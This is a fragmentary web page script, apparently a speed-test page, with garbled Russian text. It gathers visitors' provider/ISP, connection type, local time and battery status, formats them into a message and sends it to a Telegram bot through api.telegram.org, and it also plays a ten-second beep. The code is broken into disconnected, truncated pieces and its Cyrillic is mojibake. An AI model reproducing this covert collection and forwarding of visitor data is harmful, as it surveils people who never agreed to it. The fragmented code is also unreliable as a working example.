<body>

    function formatSpeed(mbps) {

    async function sendTelegramMessage(text) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,

    function playBeep() {
      try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const audioCtx = new AudioContext();
        const oscillator = audioCtx.createOscillator();
        oscillator.type = 'sine';
        oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
        oscillator.connect(audioCtx.destination);
        oscillator.start();
        oscillator.stop(audioCtx.currentTime + 10.0); // ‚è±Ô∏è 10 —Å–µ–∫—É–Ω–¥

    }

        let connectionType = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

        if (navigator.connection) {

–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${data.org || data.isp || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}

<b>‚ÑπÔ∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ:</b>
‚è∞ –í—Ä–µ–º—è: ${localTime}
üîã –ë–∞—Ç–∞—Ä–µ—è: ${batteryStatus}
